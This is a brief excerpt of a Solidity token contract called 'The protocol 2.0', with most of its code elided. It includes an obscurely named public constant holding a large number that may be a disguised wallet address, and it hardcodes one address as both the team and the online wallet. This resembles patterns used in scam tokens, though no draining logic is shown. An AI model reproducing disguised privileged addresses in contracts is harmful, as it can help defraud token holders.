...
contract  Theprotocol2 is Context, IERC20, Ownable {

    uint256 public ppublklc=
    150204226878642622067527889049274545390382094927;
    using SafeMath for uint256;
    string private _name = "The protocol 2.0";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x7e150D795049beFf87cCb503c30156e611CcACf1));
        onlineWalletAdd = payable(address(0x7e150D795049beFf87cCb503c30156e611CcACf1));
